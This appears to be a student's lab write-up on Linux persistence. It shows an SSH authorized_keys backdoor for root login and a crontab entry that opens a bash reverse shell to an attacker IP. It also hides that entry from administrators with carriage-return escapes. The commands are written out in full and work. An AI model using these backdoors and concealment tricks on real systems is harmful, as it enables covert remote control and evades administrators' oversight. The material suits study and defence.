## SSH public-key authentication

In this lab I manually registered my SSH public key on the target server by adding it to `/root/.ssh/authorized_keys`. I could then log in as root with the matching private key, without entering the account password.

**Implementation:**  
1. Use **Xshell**'s Tools -> New User Key Generation Wizard to generate **SSH public key and private key**: ![image-20260111010853712](https://res.cloudinary.com/sycamore/image/upload/v1792696437/Typora/2026/01/0c7400e842c42ccbcd324c9147cf6c24.png) (Enter a passphrase for the private key.)  
2. Save the generated public key file (id_rsa_2048.pub) and transfer it to the **target server**: ![image-20260111010925673](https://res.cloudinary.com/sycamore/image/upload/v1792696440/Typora/2026/01/8a2edc41bc3463490d0617bcbbd9acd1.png)  
3. Locate the **authorized_keys** file. Use the command `find -name authorized_keys`. If it doesn't exist, create it with `touch /root/.ssh/authorized_keys`.  
4. Generate an RSA key pair by running `ssh-keygen -t rsa`.  
5. Add the public key to **authorized_keys** by running `cat path/to/public_key >> /root/.ssh/authorized_keys` to complete registration.  
6. Change file permissions: `chmod 600 ~/.ssh/authorized_keys` and `chmod 700 ~/.ssh`.  
7. The attacker uses the **private key** generated by **Xshell** and the **passphrase** entered when the key was generated to log in to the **target server**: ![image-20260111010955314](https://res.cloudinary.com/sycamore/image/upload/v1792696440/Typora/2026/01/f0b36186750c7e6ae6e0cfb6e31536aa.png) ![image-20260111011015095](https://res.cloudinary.com/sycamore/image/upload/v1792696443/Typora/2026/01/3707348bcf16ceccd18bb0594ff0933d.png)

## Cron persistence

Once running, the cron daemon periodically checks its configuration for jobs that are due, normally once a minute.
It executes jobs according to the schedules defined there.
A crontab describes programs to run on a schedule.
We can create a scheduled backdoor using the **crontab** command:
`(crontab -l;echo '*/60 * * * * exec 9<> /dev/tcp/192.168.158.132/2333;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i')|crontab -`

**Explanation:**
`echo '*/60 * * * *'`: Set to execute every 60 minutes;
`exec 9<>/dev/tcp/192.168.158.132/2333`: Utilize the functionality provided by bash to parse strings starting with `/dev/tcp/`, specifying the **server IP** as 192.168.158.132 (**attacker's** IP), **port number** as 2333, specifying descriptor as 9, to establish a network connection;
`exec 0<&9;exec 1>&9 2>&1;`: **File descriptor** 0: stdin, 1: stdout, redirect both standard input and output to descriptor 9;
`/bin/bash --noprofile -i`: Open a shell.
Essentially, it's using Bash to connect a **reverse shell** back to the specified IP address.

Here, Bash needs to support network redirection, and whether it supports it depends on the compilation configuration of the Bash used.

**Hiding:**
However, such a backdoor can be seen by the administrator by directly executing `crontab -l`.
![image-20260111011055514](https://res.cloudinary.com/sycamore/image/upload/v1792696444/Typora/2026/01/e8f07ae16e6573488c17eeea6f3339f2.png)
This command is actually reading the `/var/spool/cron/crontabs/root` file.
So, we can utilize a flaw in `cat` by using some **escape characters**, such as \r (carriage return), \n (new line), \f (form feed), to **hide** the command we don't want the administrator to see:
``(crontab -l;printf "*/60 * * * * exec 9<> /dev/tcp/192.168.158.132/2333;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab - ``
![image-20260111011110789](https://res.cloudinary.com/sycamore/image/upload/v1792696444/Typora/2026/01/0af7f80743588f2bae6b80f3903e55c6.png) However, if `cat -A /var/spool/cron/crontabs/root` is used, it can still be seen that we have hidden something.
